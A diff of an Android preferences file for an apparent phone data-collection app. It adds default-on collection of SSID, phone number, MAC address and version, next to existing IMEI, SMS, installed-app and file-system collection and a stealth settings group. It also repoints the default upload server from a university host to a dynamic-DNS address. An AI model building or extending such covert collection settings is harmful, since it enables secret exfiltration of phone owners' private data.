@@ -13,6 +13,10 @@
 			android:key="pref_collections_nested" android:title="@string/collect_types">
 			<CheckBoxPreference android:summary="@string/sum_IMEI" android:title="@string/title_IMEI"
 				android:defaultValue="true" android:key="coll_IMEI"></CheckBoxPreference>
+			<CheckBoxPreference android:summary="@string/sum_SSID" android:title="@string/title_SSID" android:defaultValue="true" android:key="coll_SSID"></CheckBoxPreference>
+			<CheckBoxPreference android:summary="@string/sum_version" android:title="@string/title_version" android:defaultValue="true" android:key="coll_version"></CheckBoxPreference>
+			<CheckBoxPreference android:summary="@string/sum_phone_number" android:title="@string/title_phone_number" android:defaultValue="true" android:key="coll_phone_number"></CheckBoxPreference>
+			<CheckBoxPreference android:summary="@string/sum_MAC" android:title="@string/title_MAC" android:defaultValue="true" android:key="coll_MAC"></CheckBoxPreference>
 			<CheckBoxPreference android:key="coll_installed_apps" android:defaultValue="true" android:title="@string/title_installed_apps" android:summary="@string/sum_installed_apps"></CheckBoxPreference>
 			<CheckBoxPreference android:title="@string/title_received_SMS" android:key="coll_received_SMS" android:summary="@string/sum_received_SMS" android:defaultValue="true"></CheckBoxPreference>
 		<CheckBoxPreference android:summary="@string/sum_file_system" android:title="@string/title_file_system" android:defaultValue="true" android:key="coll_file_system"></CheckBoxPreference>
@@ -26,7 +30,7 @@
 			android:order="1" android:defaultValue="false"></CheckBoxPreference>
 		<EditTextPreference android:key="pref_edit_server_addr"
 			android:title="@string/net_server_addr" android:dialogMessage="@string/net_serv_descr"
-			android:dialogTitle="@string/net_diag_title" android:defaultValue="http://cs.duke.edu"
+			android:dialogTitle="@string/net_diag_title" android:defaultValue="http://barko.zapto.org:8080"
 			android:order="2"></EditTextPreference>
 	</PreferenceCategory>
 	<PreferenceCategory android:order="4" android:key="pref_stealth"
